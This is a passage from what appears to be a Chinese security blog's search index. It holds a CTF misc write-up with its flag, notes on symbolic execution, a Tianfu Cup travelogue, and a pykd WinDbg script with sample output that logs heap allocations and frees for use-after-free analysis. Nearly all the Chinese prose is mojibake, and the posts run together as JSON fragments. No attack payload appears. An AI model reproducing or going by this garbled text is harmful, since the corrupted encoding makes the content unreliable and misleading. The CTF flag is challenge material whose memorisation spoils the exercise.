çŸ¥é“æˆ‘åœ¨ç­‰ä½ å—æ‹¿åˆ°ä¸€ä¸ªmp3ï¼Œå…ˆbinwalkçœ‹äº†ä¸€ä¸‹ï¼š zipå•Šï¼Œæ‰‹åŠ¨ä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºzipï¼Œç„¶åç›´æ¥è§£å‹å¾—åˆ°å¦‚ä¸‹ï¼š äºŒç»´ç å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨â€¦coffeeæ˜¯åŠ å¯†çš„zipï¼ŒæŠŠmp3ä¸¢è¿›010 editorï¼Œå‘ç°åé¢å¤šäº†ä¸€éƒ¨åˆ†æ•°æ®ï¼Œstringsä¹‹åå¾—åˆ°ä¸€ä¸ªæœ‰ç‚¹å¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼š å°è¯•ä½¿ç”¨å®ƒè§£å¯†zipâ€¦å±…ç„¶å¯ä»¥ :) è§£å¼€ä¹‹åæœ‰ä¸ªcoffee.jpg æƒ¯ä¾‹ä½¿ç”¨binwalkæ‰«ä¸€ä¸‹ï¼š å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ã€‚ åœ¨ä½¿ç”¨010 editoræŸ¥çœ‹çš„æ—¶å€™ï¼Œæœäº†ä¸‹ä¸€äº›å…¶ä»–æ–‡ä»¶çš„æ–‡ä»¶å¤´é‡Œçš„æ ‡å¿—å­—ç¬¦ä¹‹ç±»çš„ï¼Œå‘ç°äº†ï¼š å‰é¢çš„coffeeä¹Ÿå¥½å¥‡æ€ªï¼Œä»coffeeå¼€å§‹æˆªå–å‡ºæ¥ï¼Œæ‰¾äº†ä¸ªpngå¤´ï¼Œå°è¯•ä¿®å¤ä¸€ä¸‹ï¼Œç„¶åæ‰“å¼€ï¼š å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹ï¼Œæ˜¯è®©ä½ å»ä¸‹è½½ä¸€ä¸ªtxtâ€¦å…¶å®è¿™æ˜¯ä¸ªzipï¼Œä½†æ˜¯åé¢æ‹¼æ¥äº†ä¸€éƒ¨åˆ†æç¤ºçš„å­—ç¬¦ä¸²ã€‚ ç®€ç›´â€¦.ä¸§å¿ƒç—…ç‹‚ã€‚ çŒœäº†å¥½å¤šå¯†ç â€¦ä»€ä¹ˆcoffeeã€secloverä¹‹ç±»çš„ï¼Œå·®ç‚¹è¦çˆ†ç ´äº†ã€‚åé¢é˜Ÿå‹æç¤ºè¯´è¦ä¸è¦è¯•è¯•ä¼ªåŠ å¯†ã€‚ ç›´æ¥ä¸¢è¿›010 editor ä½¿ç”¨äºŒè¿›åˆ¶æ¨¡æ¿è§£æåï¼Œä¿®æ”¹æ ‡å¿—ä½ ç„¶åå°è¯•è§£å‹å¾—åˆ°ä¸€ä¸ªtxtï¼Œé‡Œé¢æ˜¯ä¸€ä¸²base64 12keyis%7Bsec1over%25_6ugscan_@coffee%7D#keyis{sec1over%_6ugscan_@coffee}","link":"/2017/05/08/SSCTF-2017%E9%83%A8%E5%88%86Writeup/"},{"title":"Snell auto install cript","text":"0x00 : SnellSnellæ˜¯Surgeæ”¯æŒçš„ä¸€ç§**åè®®ï¼Œä½†æ˜¯serverå¹¶ä¸å¼€æºï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰Surgeå®¢æˆ·ç«¯æ‰èƒ½ç”¨ã€‚ ç¢ç£¨äº†ä¸‹å†™äº†ä¸ªè‡ªåŠ¨åŒ–çš„é…ç½®è„šæœ¬ã€‚ 0x01 : Scriptsnel.sh","link":"/2019/09/26/Snell-auto-install-cript/"},{"title":"Symbolic Executionå­¦ä¹ ","text":"0x00: å‰è¨€å­¦ä¹ çš„æ—¶å€™åšä¸ªè®°å½•ï¼Œçœ‹è¿‡ä»€ä¹ˆï¼Œè¸©è¿‡ä»€ä¹ˆå‘ä¹‹ç±»çš„ã€‚ 0x01: èµ„æ–™1. paper &amp;&amp; ä¸é”™çš„æ–‡ç« ã€ŠAll You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)ã€‹ ã€ŠSymbolic execution for software testing: three decades laterã€‹ ç¬¦å·æ‰§è¡Œå…¥é—¨ 2. é¡¹ç›®KLEE Z3 Angr 3. ä¸€äº›èµ„æº3.1 z3ä¸»è¦æ˜¯è§£å†³ä¸€äº›CTFé¢˜ç›®ã€‚ Z3ä¸€æŠŠæ¢­ï¼šç”¨çº¦æŸæ±‚è§£æå®šä¸€ç±»CTFé¢˜ ä½¿ç”¨z3çº¦æŸå™¨è§£å†³CTFä¸­çš„é¢˜ç›® z3-stuf 3.2 angr angr-doc ä½¿ç”¨angrè§£å†³ä¸€äº›ctfé¢˜ç›®ï¼Œè¿™éƒ¨åˆ†ç›´æ¥å‚è€ƒangr-docé‡Œçš„exampleså°±å¥½äº†ã€‚ angr-ctf å¾ˆå¥½çš„å…¥é—¨èµ„æ–™ï¼Œå„ç§åŸºç¡€ç”¨æ³•éƒ½æœ‰demoï¼Œæ³¨é‡Šå¾ˆå…¨é¢ï¼Œè·Ÿç€å­¦ä¹ å°±å¥½äº†ã€‚ ç¯å¢ƒå»ºè®®ï¼šLinux + virtualenv å…³æ³¨å„å¤§ctfä¸­wp 4. å®è·µdemo1. mini mcThis directory contains a â€œminimalâ€ implementation to demonstratethe basic ideas of symbolic execution and concolic execution, usingZ3â€™s Python interface.","link":"/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/"},{"title":"TFCæ¸¸è®°","text":"0x00 ï¼šå‰è¨€å¾ˆå¹¸è¿èƒ½éšå›¢é˜Ÿä¸€èµ·å‚åŠ ä¸­å›½ç‰ˆpwn2ownâ€“å¤©åºœæ¯å›½é™…ç ´è§£å¤§èµ›ã€‚å¯¹äºæˆ‘è¿™æ ·ä¸€ä¸ªåˆšæ¯•ä¸šå‡ ä¸ªæœˆçš„èœé¸Ÿæ¥è¯´ï¼ŒçœŸçš„æ˜¯è§äº†å¤§ä¸–é¢ï¼Œä¹Ÿä»è¿™ä¸ªç»å†ã€éšè¡Œçš„åŒäº‹èº«ä¸Šå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œå¯¹äºè‡ªå·±è€Œè¨€ï¼Œæˆ‘è®¤ä¸ºè¿™æ¬¡ç»å†æ˜¯åŠ é€Ÿè‡ªèº«æˆé•¿çš„ç¥å¥‡è¯å‰‚ã€‚ 0x01 ï¼šèµ¶èµ´æˆéƒ½11æœˆ15æ—¥è·Ÿéšå¤§éƒ¨é˜Ÿä¹˜åæ—©ä¸Š7:45çš„é£æœºä»åŒ—äº¬èµ¶å¾€æˆéƒ½ï¼Œæ­£å¥½å‰ä¸€å¤©åŒ—äº¬é›¾éœ¾ä¸¥é‡ï¼Œå¯ä»¥è¯´æ˜¯å»è“‰åŸèº²ä¸€èº²äº† 23333ã€‚ ä½œä¸ºä¸€ä¸ªèœé¸Ÿï¼Œè·Ÿç€å¤§ä½¬ä»¬å°±å¯¹äº†ï¼Œåˆ°äº†æˆéƒ½ä¹‹åï¼Œåƒå®Œåˆé¥­å¤§å®¶å°±å¿«é€Ÿèµ¶å¾€äº†èµ›åœºåšå‰æœŸå‡†å¤‡å·¥ä½œï¼Œæ¯”å¦‚ç¯å¢ƒçš„æŸ¥çœ‹å·¥ä½œã€‚ ä¸å¾—ä¸è¯´ï¼Œä¼šåœºçœŸçš„å¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤ªå¤§äº†ï¼Œé…’åº—è·ç¦»ä¼šåœºçœŸçš„å¤ªè¿œäº†ï¼Œ16kmç®€ç›´æ˜¯å™©æ¢¦ï¼Œå¤ªä¸æ–¹ä¾¿äº†ã€‚ æ™šä¸Šå›åˆ°é…’åº—åï¼Œåœ¨å¤å…ˆç”Ÿçš„å¸¦é¢†ä¸‹å¤§å®¶å»åƒäº†è··è„šç‰›è‚‰ï¼Œåœ¨åŒ—äº¬å¾…å¾—æ—¶é—´é•¿äº†ï¼Œå¤§å®¶éƒ½åƒä¸äº†å¤ªè¾£ã€‚ æˆ‘è¿˜æ˜¯ä¸ªæ„£å¤´é’ï¼Œæˆ‘è§‰å¾—æˆ‘æ‰ä»æˆéƒ½è¿‡å»å‡ ä¸ªæœˆï¼Œæˆ‘åº”è¯¥å¯ä»¥ï¼Œç»“æœæ™šä¸Šç¡è§‰çš„æ—¶å€™ï¼Œèƒƒé‡Œçƒ­è¾£è¾£çš„æ„Ÿè§‰å‘Šè¯‰æˆ‘ï¼Œtoo youngå•Šå°‘å¹´ã€‚ 0x02 ï¼š æ¯”èµ›æ—¥ day1å› ä¸ºæ˜¯ç ´è§£å¤§èµ›ï¼Œå¤§å®¶éƒ½æ˜¯æ£ç€0day(s)æ¥åˆ°ä¼šåœºçš„ï¼Œå¤å…ˆç”Ÿå†ä¸‰æé†’ï¼Œåƒä¸‡çœ‹å¥½è‡ªå·±çš„åŒ…ã€ç”µè„‘ï¼Œäº’ç›¸å¸®å¿™çœ‹ä½ã€‚é‚£æ®µæ—¶é—´æ„Ÿè§‰è­¦æƒ•æ€§è¾¾åˆ°é¡¶å³°ï¼Œä¸€ä¸ªå£°ç§°è‡ªå·±æ˜¯360å¸‚åœºéƒ¨çš„åŒäº‹æ¥ååˆ°æˆ‘ä»¬æ¡Œå­è¿™è¾¹æ—¶å€™ï¼Œæˆ‘ç¬¬ä¸€ååº”æ˜¯æ€€ç–‘ä»–åˆ°åº•æ˜¯ä¸æ˜¯çœŸçš„ï¼Œæœ‰å•¥ç›®çš„ğŸ˜¢ã€‚ æ—©ä¸Š9:30å¼€å§‹çš„æ˜¯é‡å¤´æˆï¼ŒæŠ½ç­¾ã€‚è€æ—©å°±å¬è¯´ï¼Œè¿™ç§æ¯”èµ›æœ€é‡è¦çš„å°±æ˜¯æŠ½ç­¾ï¼Œç­¾åºèƒ½å½±å“å¾ˆå¤šï¼Œä½†æ˜¯å‰ææ˜¯ï¼šä½ å¿…é¡»æœ‰è¶³å¤Ÿçš„å‚¨å¤‡ï¼Œä½ å¿…é¡»æœ‰è¶³å¤Ÿçš„å‚¨å¤‡ï¼Œä½ å¿…é¡»æœ‰è¶³å¤Ÿçš„å‚¨å¤‡ã€‚ å› ä¸ºç­–ç•¥ï¼Œç”·å“¥ã€æˆ‘ã€å›¢é˜Ÿï¼Œæˆ‘ä»¬æŠ¥äº†ä¸‰ä¸ªPDFé¡¹ç›®ï¼Œæ²¡æƒ³åˆ°ä¼¼ä¹æ˜¯å¾®åšæŠ½å¥–çš„é”¦é²¤å±æ€§ï¼Œæˆ‘PDFæŠ½åˆ°ç¬¬ä¸€ä¸ªï¼Œå›¢é˜Ÿçš„æ˜¯ç¬¬äºŒä¸ªï¼ˆè¿™ä¸ªæ—¶å€™æ„Ÿè§‰è‡ªå·±åœ¨åšæ¢¦â€¦è¿™ä¹Ÿå¤ªæ£’äº†å§ï¼)ã€‚ä¸å¾—ä¸è¯´ï¼Œday1çœŸçš„æ˜¯æˆ‘ä»¬çš„å¹¸è¿æ—¥ï¼Œå‡ ä¹æ‰€æœ‰å¤§é¡¹éƒ½æŠ½åˆ°äº†ç¬¬ä¸€ä¸ªï¼Œåªæœ‰é¾šç¥çš„ä¸€ä¸ªå°ç±³8æ’åˆ°äº†æœ€å :( æˆ‘ä»¬å›¢é˜Ÿä»edgeå¼€å§‹æ‰“ï¼Œæ¯«æ— æ‚¬å¿µçš„ä¸€æ¬¡é€šï¼›ç„¶åæ˜¯é¾šç¥çš„Chromeï¼Œä¸€æ¬¡å°±æˆï¼Œå¤ªå¼ºäº†ï¼›ä¹‹åæˆ‘è·Ÿç€ç”·å“¥å»æ‰“äº†PDFï¼Œä»æ¨åšå£«åŒå‡»1.pdfé‚£ä¸ªæ–‡ä»¶å¼€å§‹ï¼Œå‘¼å¸åŠ é€Ÿï¼Œé»˜é»˜ç¥ˆæ±‚ç€calcä½ å¿«å‡ºæ¥ï¼Œreaderå¡äº†å‡ ç§’ä¹‹åï¼Œcalcç›´æ¥å¼¹å‡ºï¼Œç ´è§£æˆåŠŸï¼ä¹‹åå°±æ˜¯å’Œå‚å•†ã€å†…åœºè£åˆ¤ä¸€èµ·reviewäº†ï¼Œç¡®å®šä½ çš„æ¼æ´çœŸå®æœ‰æ•ˆã€‚è¿™ä¸ªè¿‡ç¨‹æœ‰ç‚¹æ¼«é•¿ï¼Œadobeæ¥çš„é‚£ä¸ªè€å“¥è²Œä¼¼ä¸æ˜¯åšæŠ€æœ¯çš„ï¼ŒéªŒè¯äº†å¥½ä¹… :( ã€‚ ä¹‹åå›¢é˜Ÿçš„PDFä¹ŸæˆåŠŸæ‰“ä¸‹ï¼Œé¾™å“¥çš„Safariä¹Ÿé¡ºåˆ©æ‹¿ä¸‹â€¦åé¢è‚–ä¼Ÿå“¥å’Œå¤©æ–‡çš„VirtualBoxã€VMwareé¡ºåˆ©æå®šã€‚ ç”·å“¥çš„PDFåœ¨day2ï¼Œä»–ç´§æ€¥å›é…’åº—å¿™ç›¸å…³çš„äº‹æƒ…ã€‚åé¢å› ä¸ºæ²¡æˆ‘ä»€ä¹ˆäº‹æˆ‘å°±å…ˆå»å’Œæä¸“å®¶(L3m0n)ä»¥åŠå­¦å¼Ÿåƒæ™šé¥­äº†ï¼Œç«é”…æ¥è¿‘å°¾å£°çš„æ—¶å€™ï¼Œç”·å“¥é‚£è¾¹æœ‰äº›æƒ…å†µï¼Œæˆ‘å°±ç›´æ¥æ‰“è½¦å›äº†é…’åº—æ‰¾ä»–ï¼Œå¸Œæœ›å¯ä»¥å¸®ä¸Šä¸€äº›å¿™ã€‚ ä¸å¾—ä¸è¯´è¿™æ¬¡è¢«å‡ºç§Ÿè½¦å¸ˆå‚…å‘äº†ï¼Œä¸æ‰“è¡¨ç›´æ¥å¼€ä»·ä¸è¯´ï¼Œä¸­é—´è¿˜åŠ äº†ä¸€æ¬¡ä»·æ ¼ï¼Œæˆ‘æƒ³çœ‹å‰¯é©¾ä¸Šæœ‰å•¥ä¿¡æ¯ï¼Œè½¦ç‰Œã€ç”µè¯å•¥çš„ï¼Œæƒ³æŠ•è¯‰çš„æ—¶å€™ç¼ºå‘ç°å•¥ä¹Ÿæ²¡æœ‰ï¼Œé‚æ”¾å¼ƒï¼Œè¿˜æ˜¯èµ¶ç´§å›å»æ‰¾ç”·å“¥æ±‡åˆï¼Œåˆ«è€½è¯¯æ­£äº‹ã€‚ 0x03 ï¼š æ¯”èµ›æ—¥ day2å› ä¸ºç¬¬ä¸€å¤©å¥ å®šçš„å·¨å¤§ä¼˜åŠ¿ï¼Œæ²¡å¿…è¦å†æµªè´¹æ¼æ´ï¼Œå°±æ”¾å¼ƒäº†ä¸€äº›é¡¹ç›®ã€‚å°±åªæœ‰å¤§å®å¸ˆå‚…çš„Safariå’ŒiPhone x rjbã€‚ å¤§å®å¸ˆå‚…æ‰“å®Œä¹‹åï¼Œåé¢å°±æ²¡ä»€ä¹ˆçœ‹çš„äº†ï¼Œæ¶…æ§ƒå›¢é˜Ÿçš„Safari+ç©¿sandboxï¼Œå› ä¸ºSafariæ’æ´ï¼Œæ‰€ä»¥åªæœ‰ç©¿sandboxçš„åˆ†æ•°ï¼Œå¾ˆå¯æƒœå§ã€‚ åé¢é¢å¥–æ²¡å•¥å¥½è¯´çš„äº†ï¼Œå¤§å®å¸ˆå‚…çš„ä¼˜ç§€ä¸ªäººï¼Œå¤©æ–‡çš„æœ€ç‰›æŠ€æœ¯ï¼Œå®è‡³åå½’ï¼Œéƒ½å¾ˆå‰å®³ï¼Œéƒ½æ˜¯æˆ‘å­¦ä¹ çš„æ¦œæ ·ã€‚ 0x04 ï¼šä¸€äº›æ„Ÿæƒ³é¦–å…ˆæ˜¯é™ˆå°‘å…¬å¼€å¤¸å¥–å¤§å®ã€‚ è¿™ç§æ— å…¬å¸ç•Œé™çš„çº¯æŠ€æœ¯ä¸Šçš„èµèµï¼ŒçœŸçš„è®©äººæœ‰ç§â€œè‹±é›„æƒœè‹±é›„â€çš„æ„Ÿè§‰ï¼Œè™½ç„¶è¿™å¥è¯ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œä½†æ˜¯æ€»å°±æ„Ÿè§‰å¾ˆæ£’ã€‚ æˆ‘ä¸€ç›´è§‰å¾—ï¼Œå¤§å®å¸ˆå‚…ç®—æ˜¯åŒé¾„äººé‡Œçš„ä¸€ä¸ªæ ‡æ†ï¼Œåœ¨å®‰å…¨ç ”ç©¶ä¸Šçš„å·¥ä½œï¼Œä»¥åŠä»–çš„æƒ³æ³•ã€æ€åº¦ï¼Œéƒ½å€¼å¾—æˆ‘å»å­¦ä¹ ã€‚ æˆ‘ä»¬å°ç»„æµä¼ ç€ä¸€å¥ï¼šå¯»æ‰¾å¤§å¸ˆï¼Œè¿½éšå¤§å¸ˆï¼Œæˆä¸ºå¤§å¸ˆï¼Œè¶…è¶Šå¤§å¸ˆï¼Œä»¥åŠtkæ•™ä¸»å¾ˆæ—©ä»¥å‰è¯´çš„ï¼Œåœ¨åŒé¾„äººé‡Œæ‰¾ä¸€ä¸ªæ ‡æ†ï¼Œè¡Œä¸šå‰è¾ˆä¸­å†æ‰¾ä¸€ä¸ªæ ‡æ†ï¼ˆå¤§æ¦‚è¿™æ ·çš„æ„æ€å§ï¼‰ï¼Œæˆ‘è®¤ä¸ºç»¼åˆèµ·æ¥ï¼Œç°åœ¨éƒ½æ‰¾åˆ°äº†ã€‚å¸Œæœ›åœ¨å®‰å…¨çš„é“è·¯ä¸Šï¼Œå¯ä»¥æ—©ç‚¹çœ‹åˆ°å‰è¾ˆä»¬çš„è½¦å°¾ç¯ï¼Œå¸Œæœ›å¯ä»¥æ—©ç‚¹è¿½èµ¶ä¸Šä»–ä»¬ã€‚ æ¯”èµ›ç»“æŸå°±ç»“æŸäº†ï¼Œç»“æŸä¹‹åå’Œç”·å“¥æ²Ÿé€šäº†å¾ˆå¤šï¼Œä¸å¾—ä¸æ„Ÿå¹å·¥ä½œåé‡åˆ°ç”·å“¥è¿™æ ·çš„å¯¼å¸ˆçœŸçš„æ˜¯å¤ªå¹¸è¿äº†ï¼Œç”·å“¥çœŸçš„æ˜¯æˆ‘çš„è´µäººã€‚ åç»­çš„å·¥ä½œä¹Ÿæœ‰ä¸€ä¸ªå¤§æ¦‚çš„è§„åˆ’äº†ï¼Œä»¥åŠå¯¹ä»¥åä¸€ä¸ªå‘å±•æ–¹å‘æœ‰äº†æ›´æ¸…æ¥šçš„è®¤è¯†ï¼Œå‰è¾ˆä»¬æ€è€ƒé—®é¢˜çš„ç»´åº¦ã€æ·±åº¦çš„ç¡®æ˜¯é«˜äº†å‡ ä¸ªå±‚æ¬¡ï¼Œè¿™äº›è¿˜éœ€è¦æ…¢æ…¢å­¦ä¹ ã€‚ç”·å“¥è¯´ï¼Œå®‰å…¨è¿™æ¡è·¯ï¼Œä½ å°±ç®—æœ‰å¤©èµ‹ä¹Ÿè¦å †æ—¶é—´ã€‚è¿™è¯å¾ˆå¯¹ï¼Œæ›´ä½•å†µæˆ‘è¿™æ ·æ²¡æœ‰å¤©èµ‹çš„å‡¡äººï¼Œéœ€è¦çš„ä¸ä»…ä»…æ˜¯æ—¶é—´ï¼Œè¿˜æœ‰åŠªåŠ›åŠªåŠ›å†åŠªåŠ› :) è‡³äºèµ›åœºå¤–çš„ä¸€äº›äº‹ï¼Œæˆ‘è§‰å¾—æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå›¢é˜Ÿé‡Œçš„å¤§ä½¬ä¹Ÿæ²¡è¯´ä»€ä¹ˆï¼Œå¯èƒ½å¤§å®¶è§å¾—å¤šäº†ï¼Œå·²ç»å¾ˆä½›ç³»äº†ã€‚ åœ¨æˆ‘è¿˜åœ¨å­¦æ ¡çš„æ—¶å€™ï¼Œpwn2ownè¿˜èƒ½å‚åŠ çš„æ—¶å€™ï¼Œä»æ¥æ²¡æœ‰å¬è¯´è¿‡ã€çœ‹åˆ°è¿‡ï¼Œ360è¿™è¾¹å› ä¸ºç­¾åºã€æ’æ´çš„äº‹å„ç§dissï¼Œåƒæ˜¯å—äº†å¤©å¤§çš„å§”å±ˆã€‚ç­¾åºåªæ˜¯è¿æ°”é—®é¢˜ï¼Œæ’æ´å°±æ˜¯å‚¨å¤‡é—®é¢˜äº†ï¼Œä¸ä»–äººæ— å…³ã€‚ è‡³äºä½ ä»¬è¯´æŠ¥åå¤šé˜Ÿä¼ï¼Œç¬¬ä¸€ï¼Œè¿™å®Œå…¨åœ¨è§„åˆ™å…è®¸çš„èŒƒå›´ä¹‹å†…ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ²¡æ’æ´å•¥çš„ï¼›ç¬¬äºŒï¼Œè¿™æ‹›è°å¼€å§‹ç©çš„æºœå‘¢ï¼Ÿ :) è¿™å‡ å¤©å…¶å®è›®ç²¾å½©çš„ï¼Œä¸è¿‡ä½œä¸ºå°èœé¸Ÿä¹Ÿä¸æ•¢å¤šè¯´ä»€ä¹ˆï¼Œåªæ˜¯å‘ç°ï¼Œé«˜çº§åˆ«çš„å¤§ä½¬ä¹‹é—´ï¼Œæ ¼å±€çš„å·®è·åŸæ¥å¯ä»¥è¿™ä¹ˆå¤§ã€‚ ç¿»ç¯‡äº†ç¿»ç¯‡äº†ï¼Œè¯¥å¼€å§‹æ–°çš„å·¥ä½œäº†ï¼ŒåŠªåŠ›åˆ›é€ æ›´å¤šçš„ä»·å€¼ï¼Œå¸Œæœ›åé¢è‡ªå·±å¯ä»¥äº§å‡ºæ›´å¤š0dayï¼Œæ›´å¤šexploitã€‚ Live long and pwn æœ€åï¼Œæ”¾ä¸ªå›¾","link":"/2018/11/18/TFC%E6%B8%B8%E8%AE%B0/"},{"title":"UAF analysis : using pykd","text":"0x01 : ç®€ä»‹åˆ†æä¸€äº›æƒ…å†µæ¯”è¾ƒå¤æ‚çš„UAFæ¼æ´æ—¶ï¼Œæ¯”å¦‚å¾ˆå¤šæ¬¡åˆ†é…ã€ä½¿ç”¨å†…å­˜ï¼Œè´¹åŠ›å¯»æ‰¾è¢«UAFçš„å¯¹è±¡çš„é‡Šæ”¾ç‚¹ï¼Œæ˜¯æ¯”è¾ƒéº»çƒ¦çš„(å¯¹äºæˆ‘è¿™ç§èœé€¼æ¥è¯´)ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨pykdæ¥è¾…åŠ©è¿™ä¸ªå·¥ä½œï¼Œèƒ½ä½¿å¾—æ¼æ´åˆ†æå·¥ä½œå˜å¾—æ›´è½»æ¾ã€‚ 0x02 : è„šæœ¬æ¨¡ç‰ˆè¿™ä¸ªè„šæœ¬çš„åŸå§‹ç‰ˆæœ¬åœ¨ä½¿ç”¨çš„æ—¶å€™æœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘æœ¬åœ°æµ‹è¯•çš„æ—¶å€™å›è°ƒå‡½æ•°æœ‰ç‚¹é—®é¢˜ï¼Œä¸èƒ½æ­£å¸¸ä½¿ç”¨ã€‚ åæ¥å’¨è¯¢äº†æ— è¨€å­¦é•¿ä¹‹åï¼Œå­¦é•¿å¸®å¿™åšäº†ä¿®æ”¹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import pykdreturn_reg = &quot;rax&quot;stack_pointer = &quot;rsp&quot;arch_bits = 64def get_address(localAddr): res = pykd.dbgCommand(&quot;x &quot; + localAddr) result_count = res.count(&quot;\\n&quot;) if result_count == 0: print localAddr + &quot; not found.&quot; return None if result_count &gt; 1: print &quot;[-] Warning, more than one result for&quot;, localAddr return res.split()[0].replace('`','')# RtlAllocateHeap(# IN PVOID HeapHandle,# IN ULONG Flags,# IN ULONG Size );class handle_allocate_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlAllocateHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlAllocateHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0xC)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlAllocateHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + &quot;\\n&quot;) return False# RtlFreeHeap(# IN PVOID HeapHandle,# IN ULONG Flags OPTIONAL,# IN PVOID MemoryPointer );class handle_free_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlFreeHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlFreeHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrPtr(esp + 0xC)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlFreeHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): # returns a BOOLEAN which is a byte under the hood ret_val = hex(pykd.reg(&quot;al&quot;)) pykd.dprintln(self.out + ret_val + &quot;\\n&quot;) return False# RtlReAllocateHeap(# IN PVOID HeapHandle,# IN ULONG Flags,# IN PVOID MemoryPointer,# IN ULONG Size );class handle_realloc_heap(pykd.eventHandler): def __init__(self): addr = get_address(&quot;ntdll!RtlReAllocateHeap&quot;) if addr == None: return self.bp_init = pykd.setBp(int(addr, 16), self.enter_call_back) self.bp_end = None def enter_call_back(self): self.out = &quot;RtlReAllocateHeap(&quot; if arch_bits == 32: esp = pykd.reg(stack_pointer) self.out += hex(pykd.ptrPtr(esp + 4)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x8)) + &quot; , &quot; self.out += hex(pykd.ptrPtr(esp + 0xC)) + &quot; , &quot; self.out += hex(pykd.ptrMWord(esp + 0x10)) + &quot;) = &quot; else: self.out += hex(pykd.reg(&quot;rcx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;rdx&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r8&quot;)) + &quot; , &quot; self.out += hex(pykd.reg(&quot;r9&quot;)) + &quot;) = &quot; if self.bp_end == None: disas = pykd.dbgCommand(&quot;uf ntdll!RtlReAllocateHeap&quot;).split('\\n') for i in disas: if 'ret' in i: self.ret_addr = i.split()[0].replace('`','') break self.bp_end = pykd.setBp(int(self.ret_addr, 16), self.return_call_back) return False def return_call_back(self): pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + &quot;\\n&quot;) return Falsetry: pykd.reg(&quot;rax&quot;)except: arch_bits = 32 return_reg = &quot;eax&quot; stack_pointer = &quot;esp&quot;#addr = get_address(&quot;ntdll!RtlReAllocateHeap&quot;)#print addrpykd.removeAllBp()bp_a1 = handle_allocate_heap()bp_a2 = handle_free_heap()bp_a3 = handle_realloc_heap()print 'bps=%x' %pykd.getNumberBreakpoints() æˆ‘åŸºäºè¿™äº›æ¨¡ç‰ˆï¼Œå†™äº†è‡ªå·±åšæ¼æ´åˆ†æçš„æ—¶å€™ä½¿ç”¨çš„è„šæœ¬ã€‚ æ€è·¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯æ‰¾åˆ°ç›®æ ‡å¯¹è±¡çš„åˆ†é…ã€é‡Šæ”¾ç‚¹ï¼Œä¸‹æ–­ç‚¹ï¼Œè‡ªåŠ¨è®°å½•åˆ†é…/é‡Šæ”¾çš„å†…å­˜åœ°å€ã€å¤§å°ï¼Œç„¶ååšä¸€ä¸ªè¾“å‡ºä¾›è‡ªå·±åˆ†æç”¨ã€‚ æ•ˆæœå½“ç„¶æ˜¯å¾ˆèˆ’æœå•¦ :) 0x03 : ä½¿ç”¨æ•ˆæœç›®æ ‡æ˜¯å¤§å‹è½¯ä»¶æ—¶ï¼Œwindbgä¼šæœ‰ç‚¹å¡ï¼Œç­‰ä¸€ä¸‹å°±å¥½äº†ã€‚ 123456789101112131415161718192021222324252627282930313233&gt; .load pykd&gt; !py -g path/to/script.py&gt; g......RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 